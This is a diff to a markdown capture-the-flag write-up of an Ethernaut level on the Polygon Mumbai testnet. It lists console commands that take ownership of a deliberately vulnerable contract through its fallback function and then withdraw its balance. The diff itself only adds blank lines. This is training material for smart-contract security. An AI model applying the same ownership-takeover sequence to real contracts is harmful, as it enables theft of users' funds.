@@ -24,15 +24,21 @@ https://ethernaut.openzeppelin.com
 
 ## Solution
 Network: Polygon Mumbai
+
 Instance: 0xda57daF1c08A0535E6ef5D60105ECeC369a4580A
+
 Tx: https://mumbai.polygonscan.com/tx/0xe30925346ea5bde1a0bd5c1ff769dc26fb07a591194b9fc8c00de6a3339f5821
+
 Steps: 
 
 > await contract.owner()
+
 0x2a24869323C0B13Dff24E196Ba072dC790D52479
 
 > let bal = await contract.contributions('0x2a24869323C0B13Dff24E196Ba072dC790D52479')
+
 > bal.toString()
+
 '1000000000000000000000'
 
 > await contract.contribute({value: toWei("0.00000000001","ether")})
@@ -40,10 +46,11 @@ Steps:
 > await contract.sendTransaction({value: toWei("0.00001","ether")})
 
 > await contract.owner()
+
 '0xdbaE4296E3Dd9d3f31a71BA7afa1735D0BaF92F6'
 
 > player
+
 '0xdbaE4296E3Dd9d3f31a71BA7afa1735D0BaF92F6'
 
 > await contract.withdraw()
-
